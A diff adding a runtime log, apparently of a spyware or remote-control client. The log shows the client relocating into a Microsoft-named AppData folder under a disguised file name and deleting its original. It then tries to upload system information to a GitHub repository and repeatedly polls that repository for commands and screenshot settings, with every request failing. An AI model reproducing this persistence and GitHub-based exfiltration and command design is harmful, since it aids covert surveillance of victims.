@@ -1,0 +1,289 @@
+[2026-06-08 00:20:12.496] [TRACE] main: start
+[2026-06-08 00:20:12.499] [TRACE] is_privileged_account: start
+[2026-06-08 00:20:12.501] [TRACE] is_privileged_account: SID check rev=1 count=5 auth=5 sub=21
+[2026-06-08 00:20:12.502] Client starting - Running as User
+[2026-06-08 00:20:12.504] [TRACE] process_startup_arguments: start
+[2026-06-08 00:20:12.505] Elevating
+[2026-06-08 00:20:12.506] Skipping elevation request (UAC disabled) ? running without elevation
+[2026-06-08 00:20:12.508] [TRACE] main: current_exe=C:\Users\DEEBYTE COMPUTERS\Documents\New folder\downloaded_file.exe
+[2026-06-08 00:20:12.509] [TRACE] get_playready_dir: resolving target directory
+[2026-06-08 00:20:12.511] Wrong location. Relocating
+[2026-06-08 00:20:12.512] [TRACE] migrate_and_restart: start
+[2026-06-08 00:20:12.513] Current exe: "C:\\Users\\DEEBYTE COMPUTERS\\Documents\\New folder\\downloaded_file.exe"
+[2026-06-08 00:20:12.513] Args: ["downloaded_file.exe"]
+[2026-06-08 00:20:12.514] [TRACE] get_playready_dir: resolving target directory
+[2026-06-08 00:20:12.515] Target dir: "C:\\Users\\DEEBYTE COMPUTERS\\AppData\\Local\\Microsoft\\PlayReady"
+[LOG 2026-06-08 00:20:12.516] Created target directory
+[LOG 2026-06-08 00:20:12.526] Copy succeeded
+[LOG 2026-06-08 00:20:14.276] Spawned relocated process, exiting
+[2026-06-08 00:20:14.299] [TRACE] main: start
+[2026-06-08 00:20:14.303] [TRACE] is_privileged_account: start
+[2026-06-08 00:20:14.304] [TRACE] is_privileged_account: SID check rev=1 count=5 auth=5 sub=21
+[2026-06-08 00:20:14.305] Client starting - Running as User
+[2026-06-08 00:20:14.306] [TRACE] process_startup_arguments: start
+[LOG 2026-06-08 00:20:14.307] Cleanup requested for: C:\Users\DEEBYTE COMPUTERS\Documents\New folder\downloaded_file.exe
+[LOG 2026-06-08 00:20:14.313] Original file deleted successfully
+[2026-06-08 00:20:14.314] Elevating
+[2026-06-08 00:20:14.315] Skipping elevation request (UAC disabled) ? running without elevation
+[2026-06-08 00:20:14.316] [TRACE] main: current_exe=C:\Users\DEEBYTE COMPUTERS\AppData\Local\Microsoft\PlayReady\dbengin.exe
+[2026-06-08 00:20:14.317] [TRACE] get_playready_dir: resolving target directory
+[2026-06-08 00:20:14.319] Running from target location
+[2026-06-08 00:20:14.320] [TRACE] verify_unique_execution: creating mutex
+[2026-06-08 00:20:14.321] [TRACE] verify_unique_execution: unique instance confirmed
+[2026-06-08 00:20:14.323] Running without elevated privileges
+[2026-06-08 00:20:14.324] Collecting system info...
+[2026-06-08 00:20:14.325] [TRACE] gather_and_store_environment_data: start
+[2026-06-08 00:20:14.326] [TRACE] retrieve_current_user: start
+[2026-06-08 00:20:14.329] [TRACE] retrieve_current_user: DEEBYTE COMPUTERS
+[2026-06-08 00:20:15.163] [TRACE] generate_system_identifier: computing prefix
+[2026-06-08 00:20:15.165] [TRACE] retrieve_current_user: start
+[2026-06-08 00:20:15.167] [TRACE] retrieve_current_user: DEEBYTE COMPUTERS
+[2026-06-08 00:20:15.168] [TRACE] normalize_filename: input=DESKTOP-SDBADVS
+[2026-06-08 00:20:15.170] [TRACE] normalize_filename: input=DEEBYTE COMPUTERS
+[2026-06-08 00:20:15.175] Checking for existing file at https://api.github.com/repos/hehehahaheha/ToSayHello/contents/DESKTOP-SDBADVS_DEEBYTE_COMPUTERS/files/DESKTOP-SDBADVS_DEEBYTE_COMPUTERS_system_info.txt
+[2026-06-08 00:20:15.865] SHA GET status: 401 Unauthorized
+[2026-06-08 00:20:15.866] SHA GET body (snippet): {
+  "message": "Bad credentials",
+  "documentation_url": "https://docs.github.com/rest",
+  "status": "401"
+}
+[2026-06-08 00:20:15.867] GitHub PUT attempt 1/3 to https://api.github.com/repos/hehehahaheha/ToSayHello/contents/DESKTOP-SDBADVS_DEEBYTE_COMPUTERS/files/DESKTOP-SDBADVS_DEEBYTE_COMPUTERS_system_info.txt
+[2026-06-08 00:20:16.450] GitHub upload failed for DESKTOP-SDBADVS_DEEBYTE_COMPUTERS/files/DESKTOP-SDBADVS_DEEBYTE_COMPUTERS_system_info.txt (API error): 401 Unauthorized - Bad credentials
+[2026-06-08 00:20:16.459] Failed to upload system info: GitHub API error 401 Unauthorized: Bad credentials
+[2026-06-08 00:20:16.465] Polling every 10 seconds
+[2026-06-08 00:20:16.472] MAIN LOOP STARTING - About to enter polling loop
+[2026-06-08 00:20:16.477] [TRACE] main loop: iteration start
+[2026-06-08 00:20:16.481] 
+--- POLL ITERATION START ---
+[2026-06-08 00:20:16.485] [TRACE] initialize_storage_directory: start
+[2026-06-08 00:20:17.054] Unexpected response checking commands.txt: 401 Unauthorized. Continuing without creating.
+[2026-06-08 00:20:18.062] Fetching path list from GitHub...
+[2026-06-08 00:20:18.076] [COMMANDS] Fetching from: https://api.github.com/repos/hehehahaheha/ToSayHello/contents/DESKTOP-SDBADVS_DEEBYTE_COMPUTERS/commands.txt?ref=main
+[2026-06-08 00:20:18.084] [COMMANDS] GET attempt 1/4
+[2026-06-08 00:20:18.678] [COMMANDS] Response status: 401 Unauthorized
+[2026-06-08 00:20:18.679] [COMMANDS] Response body: {
+  "message": "Bad credentials",
+  "documentation_url": "https://docs.github.com/rest",
+  "status": "401"
+}
+[2026-06-08 00:20:18.680] [COMMANDS] GitHub GET returned status 401 Unauthorized
+[2026-06-08 00:20:19.681] [COMMANDS] GET attempt 2/4
+[2026-06-08 00:20:20.272] [COMMANDS] Response status: 401 Unauthorized
+[2026-06-08 00:20:20.273] [COMMANDS] Response body: {
+  "message": "Bad credentials",
+  "documentation_url": "https://docs.github.com/rest",
+  "status": "401"
+}
+[2026-06-08 00:20:20.275] [COMMANDS] GitHub GET returned status 401 Unauthorized
+[2026-06-08 00:20:21.276] [COMMANDS] GET attempt 3/4
+[2026-06-08 00:20:21.840] [COMMANDS] Response status: 401 Unauthorized
+[2026-06-08 00:20:21.842] [COMMANDS] Response body: {
+  "message": "Bad credentials",
+  "documentation_url": "https://docs.github.com/rest",
+  "status": "401"
+}
+[2026-06-08 00:20:21.844] [COMMANDS] GitHub GET returned status 401 Unauthorized
+[2026-06-08 00:20:22.846] [COMMANDS] GET attempt 4/4
+[2026-06-08 00:20:23.395] [COMMANDS] Response status: 401 Unauthorized
+[2026-06-08 00:20:23.397] [COMMANDS] Response body: {
+  "message": "Bad credentials",
+  "documentation_url": "https://docs.github.com/rest",
+  "status": "401"
+}
+[2026-06-08 00:20:23.401] [COMMANDS] GitHub GET returned status 401 Unauthorized
+[2026-06-08 00:20:23.406] ? FETCH ERROR: GitHub GET returned status 401 Unauthorized
+[2026-06-08 00:20:23.409] Processing screenshot config...
+[2026-06-08 00:20:23.411] [TRACE] handle_capture_settings: start
+[2026-06-08 00:20:23.414] [SCREENSHOT] Fetching config from: https://api.github.com/repos/hehehahaheha/ToSayHello/contents/DESKTOP-SDBADVS_DEEBYTE_COMPUTERS/screenshots/config.json?ref=main
+[2026-06-08 00:20:23.926] [SCREENSHOT] Config response status: 401 Unauthorized
+[2026-06-08 00:20:23.928] Failed to process screenshot config: HTTP status client error (401 Unauthorized) for url (https://api.github.com/repos/hehehahaheha/ToSayHello/contents/DESKTOP-SDBADVS_DEEBYTE_COMPUTERS/screenshots/config.json?ref=main)
+[2026-06-08 00:20:23.929] Sleeping for 10 seconds...
+[2026-06-08 00:20:33.932] [TRACE] main loop: iteration start
+[2026-06-08 00:20:33.936] 
+--- POLL ITERATION START ---
+[2026-06-08 00:20:33.939] [TRACE] initialize_storage_directory: start
+[2026-06-08 00:20:34.434] Unexpected response checking commands.txt: 401 Unauthorized. Continuing without creating.
+[2026-06-08 00:20:35.448] Fetching path list from GitHub...
+[2026-06-08 00:20:35.452] [COMMANDS] Fetching from: https://api.github.com/repos/hehehahaheha/ToSayHello/contents/DESKTOP-SDBADVS_DEEBYTE_COMPUTERS/commands.txt?ref=main
+[2026-06-08 00:20:35.454] [COMMANDS] GET attempt 1/4
+[2026-06-08 00:20:35.938] [COMMANDS] Response status: 401 Unauthorized
+[2026-06-08 00:20:35.942] [COMMANDS] Response body: {
+  "message": "Bad credentials",
+  "documentation_url": "https://docs.github.com/rest",
+  "status": "401"
+}
+[2026-06-08 00:20:35.949] [COMMANDS] GitHub GET returned status 401 Unauthorized
+[2026-06-08 00:20:36.954] [COMMANDS] GET attempt 2/4
+[2026-06-08 00:20:37.491] [COMMANDS] Response status: 401 Unauthorized
+[2026-06-08 00:20:37.494] [COMMANDS] Response body: {
+  "message": "Bad credentials",
+  "documentation_url": "https://docs.github.com/rest",
+  "status": "401"
+}
+[2026-06-08 00:20:37.498] [COMMANDS] GitHub GET returned status 401 Unauthorized
+[2026-06-08 00:20:38.501] [COMMANDS] GET attempt 3/4
+[2026-06-08 00:20:39.030] [COMMANDS] Response status: 401 Unauthorized
+[2026-06-08 00:20:39.031] [COMMANDS] Response body: {
+  "message": "Bad credentials",
+  "documentation_url": "https://docs.github.com/rest",
+  "status": "401"
+}
+[2026-06-08 00:20:39.032] [COMMANDS] GitHub GET returned status 401 Unauthorized
+[2026-06-08 00:20:40.033] [COMMANDS] GET attempt 4/4
+[2026-06-08 00:20:40.585] [COMMANDS] Response status: 401 Unauthorized
+[2026-06-08 00:20:40.590] [COMMANDS] Response body: {
+  "message": "Bad credentials",
+  "documentation_url": "https://docs.github.com/rest",
+  "status": "401"
+}
+[2026-06-08 00:20:40.597] [COMMANDS] GitHub GET returned status 401 Unauthorized
+[2026-06-08 00:20:40.606] ? FETCH ERROR: GitHub GET returned status 401 Unauthorized
+[2026-06-08 00:20:40.615] Processing screenshot config...
+[2026-06-08 00:20:40.642] [TRACE] handle_capture_settings: start
+[2026-06-08 00:20:40.656] [SCREENSHOT] Fetching config from: https://api.github.com/repos/hehehahaheha/ToSayHello/contents/DESKTOP-SDBADVS_DEEBYTE_COMPUTERS/screenshots/config.json?ref=main
+[2026-06-08 00:20:41.226] [SCREENSHOT] Config response status: 401 Unauthorized
+[2026-06-08 00:20:41.236] Failed to process screenshot config: HTTP status client error (401 Unauthorized) for url (https://api.github.com/repos/hehehahaheha/ToSayHello/contents/DESKTOP-SDBADVS_DEEBYTE_COMPUTERS/screenshots/config.json?ref=main)
+[2026-06-08 00:20:41.238] Sleeping for 10 seconds...
+[2026-06-08 00:20:51.241] [TRACE] main loop: iteration start
+[2026-06-08 00:20:51.243] 
+--- POLL ITERATION START ---
+[2026-06-08 00:20:51.245] [TRACE] initialize_storage_directory: start
+[2026-06-08 00:20:51.720] Unexpected response checking commands.txt: 401 Unauthorized. Continuing without creating.
+[2026-06-08 00:20:52.750] Fetching path list from GitHub...
+[2026-06-08 00:20:52.753] [COMMANDS] Fetching from: https://api.github.com/repos/hehehahaheha/ToSayHello/contents/DESKTOP-SDBADVS_DEEBYTE_COMPUTERS/commands.txt?ref=main
+[2026-06-08 00:20:52.755] [COMMANDS] GET attempt 1/4
+[2026-06-08 00:20:53.294] [COMMANDS] Response status: 401 Unauthorized
+[2026-06-08 00:20:53.297] [COMMANDS] Response body: {
+  "message": "Bad credentials",
+  "documentation_url": "https://docs.github.com/rest",
+  "status": "401"
+}
+[2026-06-08 00:20:53.299] [COMMANDS] GitHub GET returned status 401 Unauthorized
+[2026-06-08 00:20:54.301] [COMMANDS] GET attempt 2/4
+[2026-06-08 00:20:54.820] [COMMANDS] Response status: 401 Unauthorized
+[2026-06-08 00:20:54.822] [COMMANDS] Response body: {
+  "message": "Bad credentials",
+  "documentation_url": "https://docs.github.com/rest",
+  "status": "401"
+}
+[2026-06-08 00:20:54.825] [COMMANDS] GitHub GET returned status 401 Unauthorized
+[2026-06-08 00:20:55.828] [COMMANDS] GET attempt 3/4
+[2026-06-08 00:20:56.348] [COMMANDS] Response status: 401 Unauthorized
+[2026-06-08 00:20:56.353] [COMMANDS] Response body: {
+  "message": "Bad credentials",
+  "documentation_url": "https://docs.github.com/rest",
+  "status": "401"
+}
+[2026-06-08 00:20:56.360] [COMMANDS] GitHub GET returned status 401 Unauthorized
+[2026-06-08 00:20:57.367] [COMMANDS] GET attempt 4/4
+[2026-06-08 00:20:58.241] [COMMANDS] Response status: 401 Unauthorized
+[2026-06-08 00:20:58.245] [COMMANDS] Response body: {
+  "message": "Bad credentials",
+  "documentation_url": "https://docs.github.com/rest",
+  "status": "401"
+}
+[2026-06-08 00:20:58.249] [COMMANDS] GitHub GET returned status 401 Unauthorized
+[2026-06-08 00:20:58.257] ? FETCH ERROR: GitHub GET returned status 401 Unauthorized
+[2026-06-08 00:20:58.262] Processing screenshot config...
+[2026-06-08 00:20:58.266] [TRACE] handle_capture_settings: start
+[2026-06-08 00:20:58.270] [SCREENSHOT] Fetching config from: https://api.github.com/repos/hehehahaheha/ToSayHello/contents/DESKTOP-SDBADVS_DEEBYTE_COMPUTERS/screenshots/config.json?ref=main
+[2026-06-08 00:20:58.818] [SCREENSHOT] Config response status: 401 Unauthorized
+[2026-06-08 00:20:58.830] Failed to process screenshot config: HTTP status client error (401 Unauthorized) for url (https://api.github.com/repos/hehehahaheha/ToSayHello/contents/DESKTOP-SDBADVS_DEEBYTE_COMPUTERS/screenshots/config.json?ref=main)
+[2026-06-08 00:20:58.835] Sleeping for 10 seconds...
+[2026-06-08 00:21:08.842] [TRACE] main loop: iteration start
+[2026-06-08 00:21:08.843] 
+--- POLL ITERATION START ---
+[2026-06-08 00:21:08.845] [TRACE] initialize_storage_directory: start
+[2026-06-08 00:21:09.402] Unexpected response checking commands.txt: 401 Unauthorized. Continuing without creating.
+[2026-06-08 00:21:10.412] Fetching path list from GitHub...
+[2026-06-08 00:21:10.415] [COMMANDS] Fetching from: https://api.github.com/repos/hehehahaheha/ToSayHello/contents/DESKTOP-SDBADVS_DEEBYTE_COMPUTERS/commands.txt?ref=main
+[2026-06-08 00:21:10.417] [COMMANDS] GET attempt 1/4
+[2026-06-08 00:21:10.965] [COMMANDS] Response status: 401 Unauthorized
+[2026-06-08 00:21:10.969] [COMMANDS] Response body: {
+  "message": "Bad credentials",
+  "documentation_url": "https://docs.github.com/rest",
+  "status": "401"
+}
+[2026-06-08 00:21:10.973] [COMMANDS] GitHub GET returned status 401 Unauthorized
+[2026-06-08 00:21:11.978] [COMMANDS] GET attempt 2/4
+[2026-06-08 00:21:12.550] [COMMANDS] Response status: 401 Unauthorized
+[2026-06-08 00:21:12.553] [COMMANDS] Response body: {
+  "message": "Bad credentials",
+  "documentation_url": "https://docs.github.com/rest",
+  "status": "401"
+}
+[2026-06-08 00:21:12.555] [COMMANDS] GitHub GET returned status 401 Unauthorized
+[2026-06-08 00:21:13.558] [COMMANDS] GET attempt 3/4
+[2026-06-08 00:21:14.122] [COMMANDS] Response status: 401 Unauthorized
+[2026-06-08 00:21:14.125] [COMMANDS] Response body: {
+  "message": "Bad credentials",
+  "documentation_url": "https://docs.github.com/rest",
+  "status": "401"
+}
+[2026-06-08 00:21:14.130] [COMMANDS] GitHub GET returned status 401 Unauthorized
+[2026-06-08 00:21:15.135] [COMMANDS] GET attempt 4/4
+[2026-06-08 00:21:15.624] [COMMANDS] Response status: 401 Unauthorized
+[2026-06-08 00:21:15.627] [COMMANDS] Response body: {
+  "message": "Bad credentials",
+  "documentation_url": "https://docs.github.com/rest",
+  "status": "401"
+}
+[2026-06-08 00:21:15.630] [COMMANDS] GitHub GET returned status 401 Unauthorized
+[2026-06-08 00:21:15.632] ? FETCH ERROR: GitHub GET returned status 401 Unauthorized
+[2026-06-08 00:21:15.635] Processing screenshot config...
+[2026-06-08 00:21:15.642] [TRACE] handle_capture_settings: start
+[2026-06-08 00:21:15.645] [SCREENSHOT] Fetching config from: https://api.github.com/repos/hehehahaheha/ToSayHello/contents/DESKTOP-SDBADVS_DEEBYTE_COMPUTERS/screenshots/config.json?ref=main
+[2026-06-08 00:21:16.140] [SCREENSHOT] Config response status: 401 Unauthorized
+[2026-06-08 00:21:16.148] Failed to process screenshot config: HTTP status client error (401 Unauthorized) for url (https://api.github.com/repos/hehehahaheha/ToSayHello/contents/DESKTOP-SDBADVS_DEEBYTE_COMPUTERS/screenshots/config.json?ref=main)
+[2026-06-08 00:21:16.153] Sleeping for 10 seconds...
+[2026-06-08 00:21:26.158] [TRACE] main loop: iteration start
+[2026-06-08 00:21:26.162] 
+--- POLL ITERATION START ---
+[2026-06-08 00:21:26.168] [TRACE] initialize_storage_directory: start
+[2026-06-08 00:21:26.668] Unexpected response checking commands.txt: 401 Unauthorized. Continuing without creating.
+[2026-06-08 00:21:27.676] Fetching path list from GitHub...
+[2026-06-08 00:21:27.678] [COMMANDS] Fetching from: https://api.github.com/repos/hehehahaheha/ToSayHello/contents/DESKTOP-SDBADVS_DEEBYTE_COMPUTERS/commands.txt?ref=main
+[2026-06-08 00:21:27.679] [COMMANDS] GET attempt 1/4
+[2026-06-08 00:21:28.151] [COMMANDS] Response status: 401 Unauthorized
+[2026-06-08 00:21:28.156] [COMMANDS] Response body: {
+  "message": "Bad credentials",
+  "documentation_url": "https://docs.github.com/rest",
+  "status": "401"
+}
+[2026-06-08 00:21:28.159] [COMMANDS] GitHub GET returned status 401 Unauthorized
+[2026-06-08 00:21:29.163] [COMMANDS] GET attempt 2/4
+[2026-06-08 00:21:29.662] [COMMANDS] Response status: 401 Unauthorized
+[2026-06-08 00:21:29.666] [COMMANDS] Response body: {
+  "message": "Bad credentials",
+  "documentation_url": "https://docs.github.com/rest",
+  "status": "401"
+}
+[2026-06-08 00:21:29.670] [COMMANDS] GitHub GET returned status 401 Unauthorized
+[2026-06-08 00:21:30.673] [COMMANDS] GET attempt 3/4
+[2026-06-08 00:21:31.121] [COMMANDS] Response status: 401 Unauthorized
+[2026-06-08 00:21:31.123] [COMMANDS] Response body: {
+  "message": "Bad credentials",
+  "documentation_url": "https://docs.github.com/rest",
+  "status": "401"
+}
+[2026-06-08 00:21:31.124] [COMMANDS] GitHub GET returned status 401 Unauthorized
+[2026-06-08 00:21:32.126] [COMMANDS] GET attempt 4/4
+[2026-06-08 00:21:32.659] [COMMANDS] Response status: 401 Unauthorized
+[2026-06-08 00:21:32.664] [COMMANDS] Response body: {
+  "message": "Bad credentials",
+  "documentation_url": "https://docs.github.com/rest",
+  "status": "401"
+}
+[2026-06-08 00:21:32.668] [COMMANDS] GitHub GET returned status 401 Unauthorized
+[2026-06-08 00:21:32.674] ? FETCH ERROR: GitHub GET returned status 401 Unauthorized
+[2026-06-08 00:21:32.677] Processing screenshot config...
+[2026-06-08 00:21:32.681] [TRACE] handle_capture_settings: start
+[2026-06-08 00:21:32.686] [SCREENSHOT] Fetching config from: https://api.github.com/repos/hehehahaheha/ToSayHello/contents/DESKTOP-SDBADVS_DEEBYTE_COMPUTERS/screenshots/config.json?ref=main
+[2026-06-08 00:21:33.166] [SCREENSHOT] Config response status: 401 Unauthorized
+[2026-06-08 00:21:33.173] Failed to process screenshot config: HTTP status client error (401 Unauthorized) for url (https://api.github.com/repos/hehehahaheha/ToSayHello/contents/DESKTOP-SDBADVS_DEEBYTE_COMPUTERS/screenshots/config.json?ref=main)
+[2026-06-08 00:21:33.177] Sleeping for 10 seconds...
+[2026-06-08 00:21:43.181] [TRACE] main loop: iteration start
+[2026-06-08 00:21:43.182] 
+--- POLL ITERATION START ---
+[2026-06-08 00:21:43.183] [TRACE] initialize_storage_directory: start
+[2026-06-08 00:21:43.675] Unexpected response checking commands.txt: 401 Unauthorized. Continuing without creating.
